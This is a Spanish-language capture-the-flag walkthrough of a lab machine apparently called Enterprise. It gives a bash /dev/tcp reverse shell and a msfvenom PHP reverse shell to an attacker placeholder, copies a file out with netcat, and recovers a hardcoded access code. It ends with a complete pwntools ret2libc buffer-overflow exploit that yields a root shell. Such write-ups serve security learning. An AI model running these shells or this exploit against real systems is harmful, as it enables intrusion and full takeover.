Se realiza una *Reverse Shell*.
#### Reverse Shell

Máquina atacante:

```PowerShell
system("bash -c 'bash -i >& /dev/tcp/[ATTACKER_IP]/443 0>&1'");
```

Máquina victima:

```HTTP
http://10.129.13.76:8080/error.php
```

Se obtiene una consola interactiva con `www-data`.

Se observa que la ruta: `/var/www/html`.

```PowerShell
ls -la | grep files
drwxrwxrwx  2 root     root        4096 Oct 17  2017 files
cd files
ls -l
total 4
-rw-r--r-- 1 root root 1406 Oct 17  2017 lcars.zip
```

En la ruta anteriormente explotada, pero se ejecuta como `root`. Además de visualizar si es una montura.

```PowerShell
mount | grep files
/dev/mapper/enterprise--vg-root on /var/www/html/files type ext4 (rw,relatime,errors=remount-ro,data=ordered)
```

Si lo es, del contenedor original.
### Host Reverse Shell

Máquina atacante:

```PowerShell
msfvenom -p php/reverse_php LHOST=[ATTACKER_IP] LPORT=1234 -f raw > reverse.php
cat reverse.php | base64 -w 0; echo # Se copia el output
nc -nlvp 1234
```

Máquina victima:

```PowerShell
echo [reverseShell_base64] | base64 -d > reverse.php
https://10.129.13.76/files/reverse.php
```

Se obtiene una consola interactiva con `www-data`.

```PowerShell
hostname -I
10.129.13.76 172.17.0.1 dead:beef::a0de:adff:fe93:9ae2
```

La flag de `usuario` se encuentra en: `/home/jeanlucpicard`.

---
## Privilege Escalation
### SUID

```PowerShell
find / -perm -4000 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/at
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/chsh
/bin/umount
/bin/su
/bin/ping
/bin/ntfs-3g
/bin/mount
/bin/lcars
/bin/fusermount
```

Se observa el ejecutable: `/bin/lcars`.

```PowerShell
lcars

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System

Enter Bridge Access Code: 


Invalid Code
Terminating Console
```

Se observa que cuando hicimos el reconocimiento con `nmap`, se trata del puerto: `32812`.

Se comprueba el usuario que lo ejecuta.

```PowerShell
ls -la | grep lcars
-rwsr-xr-x  1 root root   12152 Sep  8  2017 lcar
```

Lo ejecuta `root`.
#### Buffer Overflow

Ahora que tenemos acceso al sistema, podemos descargarlo.

Máquina atacante:

```PowerShell
mkdir lcars
cd lcars
nc -nlvp 444 > lcars
Ctrl + C
md5sum lcars
cf72dd251d6fee25e638e9b8be1f8dd3  lcars
```

Máquina victima:

```PowerShell
cd /bin
nc [ATTACKER_IP] 444 < lcars
md5sum lcars
cf72dd251d6fee25e638e9b8be1f8dd3  lcars
```

Si coinciden los *hash*, se paso correctamente todo el archivo.

Le damos permisos de ejecución, y con `ltrace`, inspeccionamos a bajo nivel las cosas que están pasando.

```PowerShell
chmod +x lcars
ltrace ./lcars
__libc_start_main(["./lcars"] <unfinished ...>
setresuid(0, 0, 0, 0x565f3ca8)                                                                                                                    = 0xffffffff
puts(""
)                                                                                                                                          = 1
puts("                 _______ _______"...                 _______ _______  ______ _______
)                                                                                                       = 49
puts("          |      |       |_____|"...          |      |       |_____| |_____/ |______
)                                                                                                       = 49
puts("          |_____ |_____  |     |"...          |_____ |_____  |     | |    \_ ______|
)                                                                                                       = 49
puts(""
)                                                                                                                                          = 1
puts("Welcome to the Library Computer "...Welcome to the Library Computer Access and Retrieval System

)                                                                                                       = 61
puts("Enter Bridge Access Code: "Enter Bridge Access Code: 
)                                                                                                                = 27
fflush(0xf7f71d40)                                                                                                                                = 0
fgets(
"\n", 9, 0xf7f715c0)                                                                                                                        = 0xffe42117
strcmp("\n", "picarda1")                                                                                                                          = -1
puts("\nInvalid Code\nTerminating Consol"...
Invalid Code
Terminating Console

)                                                                                                     = 35
fflush(0xf7f71d40)                                                                                                                                = 0
exit(0 <no return ...>
+++ exited (status 0) +++
```

Se observa: `strcmp("\n", "picarda1")`.

Se ejecuta el binario.

```PowerShell
./lcars

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System

Enter Bridge Access Code: 
picarda1

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System



LCARS Bridge Secondary Controls -- Main Menu: 

1. Navigation
2. Ships Log
3. Science
4. Security
5. StellaCartography
6. Engineering
7. Exit
Waiting for input:
```

Se analiza el código fuente, mediante [gHidra](https://github.com/nationalsecurityagency/ghidra).

El análisis del binario revela una lectura insegura de datos en la opción "Security", permitiendo sobrescribir el registro EIP.  
  
Tras calcular el offset mediante patrones cíclicos, se determina que son necesarios 212 bytes para controlar el flujo de ejecución.  
  
Debido a la presencia de NX, se emplea una técnica de ret2libc reutilizando las funciones `system()` y `exit()`, junto con la cadena `sh` presente en memoria.

En el siguiente video del tito: [s4vitar - Enterprise](https://www.youtube.com/watch?v=2ZzVu5mdzgA), se explica correctamente como analiza el código de `lcars` y como explotar el **Buffer Overflow**.

Se crea un script para explotarlo.

```Python
#!/usr/bin/python3

from pwn import *

def bufferOverflow():

    # ret2libc -> EIP -> system_addr + exit_addr + bin_sh_addr

    offset = 212
    junk = b"A"*offset

# (gdb) p system
# $1 = {<text variable, no debug info>} 0xf7e4c060 <system>
# (gdb) p exit
# $2 = {<text variable, no debug info>} 0xf7e3faf0 <exit>
# (gdb) find &system,+9999999,"sh"
# 0xf7f6ddd5
# 0xf7f6e7e1
# 0xf7f70a14
# 0xf7f72582
# warning: Unable to access 16000 bytes of target memory at 0xf7fc8485, halting search.
# 4 patterns found.
# (gdb) x/s 0xf7f6ddd5
# 0xf7f6ddd5:     "sh"

    system_addr = p32(0xf7e4c060)
    exit_addr = p32(0xf7e3faf0)
    bin_sh_addr = p32(0xf7f6ddd5)

    payload = junk + system_addr + exit_addr + bin_sh_addr

    context(os='linux', arch='i386')
    host, port= "10.129.11.253", 32812

    r = remote(host, port)

    r.recvuntil(b"Enter Bridge Access Code:")
    r.sendline(b"picarda1")
    r.recvuntil(b"Waiting for input:")
    r.sendline(b"4")
    r.recvuntil(b"Enter Security Override:")
    r.sendline(payload)

    r.interactive()

if __name__ == '__main__':

    bufferOverflow()
```

```PowerShell
python3 exploit.sh
```

Se obtiene una consola interactiva con `root`.

La flag de `root` se encuentra en `/root/`.

---